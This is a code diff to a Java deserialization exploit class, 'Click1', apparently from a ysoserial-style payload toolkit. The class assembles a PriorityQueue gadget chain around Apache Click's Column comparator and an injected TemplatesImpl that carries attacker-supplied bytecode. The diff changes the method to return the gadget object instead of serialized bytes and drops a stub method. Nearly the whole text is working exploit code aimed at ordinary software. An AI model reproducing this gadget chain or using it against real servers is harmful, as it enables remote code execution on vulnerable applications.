@@ -46,7 +46,7 @@ import java.util.PriorityQueue;
  */
 public class Click1 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         // prepare a Column.comparator with mock values
         final Column column = new Column("lowestSetBit");
         column.setTable(new Table());
@@ -67,19 +67,7 @@ public class Click1 implements ObjectPayload<Object> {
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
         final Object   templates  = Gadgets.createTemplatesImpl(type, param);
         queueArray[0] = templates;
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(queue);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return queue;
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
-    }
 }
